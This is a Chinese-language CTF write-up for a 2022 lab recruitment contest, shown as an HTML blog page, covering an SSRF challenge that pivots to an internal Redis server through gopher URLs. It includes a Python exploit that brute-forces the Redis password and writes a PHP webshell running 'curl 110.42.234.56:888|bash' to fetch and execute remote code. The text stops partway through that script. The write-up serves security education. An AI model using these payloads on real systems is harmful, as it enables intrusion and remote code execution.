<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="写一下2022年实验室招新赛题目的wp吧，这次招新赛我出了5道Web题目，并且搭建了整个靶场，收获很多。在出题的过程中，我对一些题目也有了更深的理解，这里记录一下这五道题目的题解吧。 snert翻译获取线索打开环境，查看网站源码，发现一个hint：  传递source参数，得到：  很明显就可以看出，这里输出了ifconfig，我们可以通过这些获得一些内网信息。 输入框中随意输入字符，页面响应时间">
<meta property="og:type" content="article">
<meta property="og:title" content="2022 SWCTF WriteUp">
<meta property="og:url" content="https://r4inb00w.github.io/2022/05/07/swctf/index.html">
<meta property="og:site_name" content="rainb0w">
<meta property="og:description" content="写一下2022年实验室招新赛题目的wp吧，这次招新赛我出了5道Web题目，并且搭建了整个靶场，收获很多。在出题的过程中，我对一些题目也有了更深的理解，这里记录一下这五道题目的题解吧。 snert翻译获取线索打开环境，查看网站源码，发现一个hint：  传递source参数，得到：  很明显就可以看出，这里输出了ifconfig，我们可以通过这些获得一些内网信息。 输入框中随意输入字符，页面响应时间">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://r4inb00w.github.io/images/4dd4c7e8bf650027.png">
<meta property="og:image" content="https://r4inb00w.github.io/images/81be3812550efcdc.png">
<meta property="og:image" content="https://r4inb00w.github.io/images/ed713dd72868ff05.png">
<meta property="og:image" content="https://r4inb00w.github.io/images/26e0bd7642a2c404.png">
<meta property="og:image" content="https://r4inb00w.github.io/images/e4f11a8fd9e8a419.png">
<meta property="og:image" content="https://r4inb00w.github.io/images/8b1c5c204800d886.png">
<meta property="og:image" content="https://r4inb00w.github.io/images/72614e159ef2c3bc.png">
<meta property="og:image" content="https://r4inb00w.github.io/images/e5fbfa03ae923fdd.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/626687a7b10bd.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/626687bf82c09.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/6266a41d239250f7c5e52df2.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/626687db50948.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/626687ed9706b.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/6266882b239250f7c593652b.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/626688a3239250f7c5946bfa.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/626688b1239250f7c5948fdc.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/626688be239250f7c594acee.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/626688cf239250f7c594d5bf.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/626688de239250f7c594fb28.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/626688ed239250f7c595205b.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/626688f9239250f7c59539cb.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/62668908239250f7c5955d72.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/62668972239250f7c5964911.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/62668986239250f7c5967974.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/62668993239250f7c5969f68.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/626689a2239250f7c596c157.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/626689b8239250f7c596f51f.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/62669e80239250f7c5cd0f61.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/62669ec2239250f7c5ce15e1.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/626689ca239250f7c5971e78.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/626689f2239250f7c59779c9.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/62668a31239250f7c59810fb.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/62668a2a239250f7c597ffe1.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/62668a54239250f7c5985d4c.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/62668a93239250f7c598f60a.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/62668a9f239250f7c59916c0.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/62668aa9239250f7c5993370.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/62668ab6239250f7c59954ff.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/62668ad2239250f7c5999cc0.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/62668ae9239250f7c599dac5.png">
<meta property="article:published_time" content="2022-05-07T00:00:00.000Z">
<meta property="article:modified_time" content="2023-12-10T13:00:55.882Z">
<meta property="article:author" content="rainb0w">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://r4inb00w.github.io/images/4dd4c7e8bf650027.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>2022 SWCTF WriteUp</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Articles</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2022/06/19/thinkphpAudit/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://r4inb00w.github.io/2022/05/07/swctf/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://r4inb00w.github.io/2022/05/07/swctf/&text=2022 SWCTF WriteUp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://r4inb00w.github.io/2022/05/07/swctf/&title=2022 SWCTF WriteUp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://r4inb00w.github.io/2022/05/07/swctf/&is_video=false&description=2022 SWCTF WriteUp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=2022 SWCTF WriteUp&body=Check out this article: https://r4inb00w.github.io/2022/05/07/swctf/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://r4inb00w.github.io/2022/05/07/swctf/&title=2022 SWCTF WriteUp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://r4inb00w.github.io/2022/05/07/swctf/&title=2022 SWCTF WriteUp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://r4inb00w.github.io/2022/05/07/swctf/&title=2022 SWCTF WriteUp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://r4inb00w.github.io/2022/05/07/swctf/&title=2022 SWCTF WriteUp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://r4inb00w.github.io/2022/05/07/swctf/&name=2022 SWCTF WriteUp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://r4inb00w.github.io/2022/05/07/swctf/&t=2022 SWCTF WriteUp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#snert%E7%BF%BB%E8%AF%91"><span class="toc-number">1.</span> <span class="toc-text">snert翻译</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%BA%BF%E7%B4%A2"><span class="toc-number">1.1.</span> <span class="toc-text">获取线索</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8gopher%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BBredis%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.2.</span> <span class="toc-text">利用gopher协议攻击redis数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E8%84%9A%E6%9C%AC%E5%B0%86webshell%E5%86%99%E5%85%A5%E4%B8%BB%E6%9C%BA%E4%B8%AD"><span class="toc-number">1.3.</span> <span class="toc-text">写脚本将webshell写入主机中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7Gopherus%E5%BE%97%E5%88%B0payload"><span class="toc-number">1.4.</span> <span class="toc-text">利用工具Gopherus得到payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E4%BA%BA%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">2.</span> <span class="toc-text">主人的命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%BA%BF%E7%B4%A2-1"><span class="toc-number">2.1.</span> <span class="toc-text">获取线索</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1%E4%BB%A3%E7%A0%81"><span class="toc-number">2.2.</span> <span class="toc-text">审计代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99EXP"><span class="toc-number">2.3.</span> <span class="toc-text">编写EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshell"><span class="toc-number">2.4.</span> <span class="toc-text">写入webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.5.</span> <span class="toc-text">反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#difficult-ssti"><span class="toc-number">3.</span> <span class="toc-text">difficult_ssti</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%BA%BF%E7%B4%A2-2"><span class="toc-number">3.1.</span> <span class="toc-text">获取线索</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4"><span class="toc-number">3.2.</span> <span class="toc-text">绕过过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI-eval%E5%87%BD%E6%95%B0%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.3.</span> <span class="toc-text">SSTI+eval函数反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezphp"><span class="toc-number">4.</span> <span class="toc-text">ezphp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Error%E7%B1%BB%EF%BC%9A"><span class="toc-number">4.1.</span> <span class="toc-text">Error类：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exception-%E7%B1%BB"><span class="toc-number">4.2.</span> <span class="toc-text">Exception 类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Getflag"><span class="toc-number">4.3.</span> <span class="toc-text">Getflag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%AB%E8%B8%A9%E7%99%BD%E5%9D%97%E5%84%BF"><span class="toc-number">5.</span> <span class="toc-text">别踩白块儿</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        2022 SWCTF WriteUp
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">rainb0w</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-05-07T00:00:00.000Z" class="dt-published" itemprop="datePublished">2022-05-07</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>写一下2022年实验室招新赛题目的wp吧，这次招新赛我出了5道Web题目，并且搭建了整个靶场，收获很多。在出题的过程中，我对一些题目也有了更深的理解，这里记录一下这五道题目的题解吧。</p>
<h2 id="snert翻译"><a href="#snert翻译" class="headerlink" title="snert翻译"></a>snert翻译</h2><h3 id="获取线索"><a href="#获取线索" class="headerlink" title="获取线索"></a>获取线索</h3><p>打开环境，查看网站源码，发现一个hint：</p>
<p><a href="/images/4dd4c7e8bf650027.png" class="gallery-item"><img src="/images/4dd4c7e8bf650027.png"></a></p>
<p>传递<code>source</code>参数，得到：</p>
<p><a href="/images/81be3812550efcdc.png" class="gallery-item"><img src="/images/81be3812550efcdc.png"></a></p>
<p>很明显就可以看出，这里输出了<code>ifconfig</code>，我们可以通过这些获得一些内网信息。</p>
<p>输入框中随意输入字符，页面响应时间很长，再加上刚刚得到的一些信息，猜测这里存在ssrf漏洞，输入百度域名进行尝试：</p>
<p><a href="/images/ed713dd72868ff05.png" class="gallery-item"><img src="/images/ed713dd72868ff05.png"></a></p>
<p>确认是ssrf漏洞。对word参数进行fuzz，发现<code>file</code>协议和<code>dict</code>协议这两个常⽤的读取⽂件的协议被过滤。但是我们可以通过如下方式来进行绕过：</p>
<p><code>file&lt;空格&gt;///xxxxx</code>。怎样得知我们需要读取的文件目录呢？这里有两个线索，首先我们利用wappalyzer</p>
<p><a href="/images/26e0bd7642a2c404.png" class="gallery-item"><img src="/images/26e0bd7642a2c404.png"></a></p>
<p>得知网站的编程语言使用的是PHP，然后我们随意进入一个目录，根据网站弹出报错信息：</p>
<p><a href="/images/e4f11a8fd9e8a419.png" class="gallery-item"><img src="/images/e4f11a8fd9e8a419.png"></a></p>
<p>得知网站使用的是apache这个web服务器，而apache的默认网站根目录为&#x2F;var&#x2F;www&#x2F;html，因此我们要读取的源码文件就是<code>/var/www/html/index.php</code>。</p>
<p>利用该方式读取源码（<code>?word=file: ///var/www/html/index.php&amp;submit=%E6%8F%90%E4%BA%A4</code>）：</p>
<p><a href="/images/8b1c5c204800d886.png" class="gallery-item"><img src="/images/8b1c5c204800d886.png"></a></p>
<p>弹出两个index.php页面，查看网页源码即可得到php代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$word</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$curl_cmd</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="comment">//危险！危险！危险！</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl_cmd</span>, CURLOPT_URL, <span class="variable">$word</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl_cmd</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/%3fphp|\?php|%26|&amp;|%3f%70%68%70|?%70%68%70|ls/i&#x27;</span>,<span class="variable">$word</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;输入这些是想干啥捏？-。-&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl_cmd</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl_cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$word</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;word&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/dict|\.\.\/|https\:\/\/|_|127.0.0.1|0.0.0.0|localhost|file\:\//is&#x27;</span>, <span class="variable">$word</span>,<span class="variable">$match</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Brody和Chad这周末会举办一个超棒的派对，所有的大黑客都会出席，但你猜谁收不到邀请？你！↖（^ω^）↗&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl</span>(<span class="variable">$word</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ifconfig&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>审计代码，发现源码中使用了<code>curl_exec</code>函数，并且函数中的参数可控，因此导致了ssrf。我们可以发现这里过滤了dict、file和https协议，但是http协议还可以使用，可以利用http协议来探测内网其他网段的信息。接下来我们传入参数<code>?word=http%3A%2F%2F172.26.0.3&amp;submit=%E6%8F%90%E4%BA%A4</code> 并抓包，探测内网存活主机：</p>
<p><a href="/images/72614e159ef2c3bc.png" class="gallery-item"><img src="/images/72614e159ef2c3bc.png"></a></p>
<p>观察结果，我们发现172.26.0.2的主机给出我们提示：</p>
<p><a href="/images/e5fbfa03ae923fdd.png" class="gallery-item"><img src="/images/e5fbfa03ae923fdd.png"></a></p>
<p>接着我们对172.26.0.2的主机进行端口扫描。为了节约时间，通常我们只需要对常用端口进行扫描即可，因此利用常用端口字典进行爆破是一种好办法。但是直接进行从0-65535爆破也是可以的(没有什么不可以的，只是需要时间很长罢了)，方法与上面类似：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/626687a7b10bd.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626687a7b10bd.png"></a></p>
<p>通过扫描结果，我们发现6379端口处于开放状态，而6379属于<code>redis</code> 数据库的端口，并且根据回显的 报错信息也能确认⽬标服务器使⽤了redis数据库：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/626687bf82c09.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626687bf82c09.png"></a></p>
<p>这⾥我们可以使⽤ssrf通过redis认证攻击来对服务器进行攻击（<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/113396148">SSRF漏洞攻击Redis介绍</a>）。</p>
<h3 id="利用gopher协议攻击redis数据库"><a href="#利用gopher协议攻击redis数据库" class="headerlink" title="利用gopher协议攻击redis数据库"></a>利用gopher协议攻击redis数据库</h3><p>由于dict协议被过滤，所以这⾥我们使⽤ <code>gopher</code>协议。</p>
<p>gopher协议格式：</p>
<p><code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</code> （’_‘字符可以更换为任意字符，但不可省略。）​</p>
<ul>
<li><p>gopher的默认端口是70，如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</p>
</li>
<li><p>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</p>
</li>
</ul>
<p>在gopher协议中发送HTTP的数据，需要以下三步：​</p>
<ol>
<li><p>构造HTTP数据包</p>
</li>
<li><p>URL编码、替换回车换行为%0d%0a</p>
</li>
<li><p>发送gopher协议</p>
</li>
</ol>
<h3 id="写脚本将webshell写入主机中"><a href="#写脚本将webshell写入主机中" class="headerlink" title="写脚本将webshell写入主机中"></a>写脚本将webshell写入主机中</h3><p>我们可以利用一些简单的命令测试一下redis是否已经认证过了，比如这样：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set snert <span class="number">1</span></span><br><span class="line">save</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>

<p>通过gopher协议和redis数据包格式构造数据流后，得到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://172.26.0.2:6379/a%2A3%0D%0A%243%0D%0Aset%0D%0A%245%0D%0Asnert%0D%0A%241%0D%0A1%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0A</span><br></pre></td></tr></table></figure>

<p>传入后，回显如下：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/6266a41d239250f7c5e52df2.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/6266a41d239250f7c5e52df2.png"></a></p>
<p>提示存在密码。</p>
<p>这里直接贴上我写的exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://web.snert.cn:5000/index.php&#x27;</span></span><br><span class="line">protocol = <span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip = <span class="string">&quot;172.26.0.2&quot;</span></span><br><span class="line">port = <span class="string">&quot;6379&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd += <span class="string">&quot;*&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd += CRLF + <span class="string">&quot;$&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>, <span class="string">&quot; &quot;</span>)))) + CRLF + x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>, <span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd += CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">cmd</span>):</span><br><span class="line">    payload = protocol + ip + <span class="string">&quot;:&quot;</span> + port + <span class="string">&quot;/a&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.parse.quote(redis_format(x))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    shell = <span class="string">&quot;\n\n\n\n&lt;?=system(\&quot;curl 110.42.234.56:888|bash\&quot;);?&gt;\n\n\n\n&quot;</span><span class="comment">#开始和结束的\n必须要有一个，也就是前后各有一个，当然，多个也可以，如果是写在crontab中可以避免crontab的语法错误。</span></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    cmd = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">        cmd = [<span class="string">&quot;auth &quot;</span>,</span><br><span class="line">               <span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">               <span class="string">&#x27;save&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;quit&#x27;</span></span><br><span class="line">               ]</span><br><span class="line">        cmd[<span class="number">0</span>] += <span class="built_in">str</span>(i)</span><br><span class="line">        payload = main(cmd)</span><br><span class="line">        params = &#123;<span class="string">&#x27;word&#x27;</span>:<span class="string">&#x27;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(payload),<span class="string">&#x27;submit&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">        req = requests.get(url,params)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ERR invalid password&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;找到密码，密码为：&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    cmd.insert(<span class="number">2</span>,<span class="string">&quot;set snert &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)))</span><br><span class="line">    cmd.insert(<span class="number">3</span>,<span class="string">&quot;config set dir /var/www/html&quot;</span>)</span><br><span class="line">    cmd.insert(<span class="number">4</span>,<span class="string">&quot;config set dbfilename shell.php&quot;</span>)</span><br><span class="line">    payload = main(cmd)</span><br><span class="line">    params = &#123;<span class="string">&#x27;word&#x27;</span>: <span class="string">&#x27;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(payload), <span class="string">&#x27;submit&#x27;</span>: <span 